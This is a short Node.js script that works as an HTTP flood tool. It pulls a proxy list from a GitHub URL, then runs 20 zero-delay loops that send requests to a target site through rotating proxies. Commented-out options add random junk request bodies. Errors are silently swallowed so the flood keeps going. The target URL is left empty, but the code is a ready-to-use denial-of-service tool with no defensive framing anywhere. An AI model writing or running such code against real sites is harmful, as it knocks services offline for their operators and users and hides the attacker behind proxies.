const {HttpProxyAgent} = require("http-proxy-agent");
//const fetch = require("node-fetch");
process.on("unhandledRejection",e=>{});
const site = "";
const types = 
  //"POST PUT PATCH DELETE OPTIONS GET".split(" ")
  ["GET"]
;
(async ()=>{
let http = await fetch("https://raw.githubusercontent.com/gooferdoofer1-web/proxylistformehttp/refs/heads/main/mixedwithproxiestotest.txt");
http = await http.text();
http = http.split("\n");
http.pop();
let times = [];
console.log("http loaded");
  i = 0;
  for (let n=0;n<20;n++) setInterval(()=>{try {
    let a = "";
    const agent = new HttpProxyAgent(a=http[i++%http.length]);
    let fetchobj = {};
    const usingType = types[Math.random() * types.length | 0];
    fetchobj.method = usingType;
    if (usingType !== "GET") {
      fetchobj.headers = {
        "Content-Type": "text/plain"
      };
      fetchobj.body = Array.from({length: 1000},()=>String.fromCharCode(Math.random() * 65536 | 0)).join("")
    }
    fetchobj.agent = agent;
    let fetchTime = new Date().getTime();
    fetch(site,fetchobj);
    console.log(a.split("//")[1].split(":")[0]+" -> "+site+" METHOD: "+fetchobj.method)
  } catch (e) {}
});
})()
